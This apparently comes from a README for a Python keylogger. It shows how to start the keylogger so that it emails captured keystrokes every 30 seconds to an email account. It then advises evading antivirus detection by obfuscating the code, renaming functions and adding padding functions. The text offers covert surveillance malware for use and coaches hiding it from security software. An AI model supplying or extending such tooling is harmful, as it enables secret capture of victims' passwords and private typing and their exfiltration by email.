# Send a keylogs report by email
Send a report of keylogs by email:

```python
keylogger = Keylogger(30, 'email', 'password')
keylogger.start()
```
The first parameter indicates every how many seconds the report will be sent to your email, and then provide an email and password for an account that will send the key logs to itself.
Tool might be detected by antiviruses, this can be circumvented by obfuscating the code, changing the name of the functions, adding padding functions, etc. Be creative!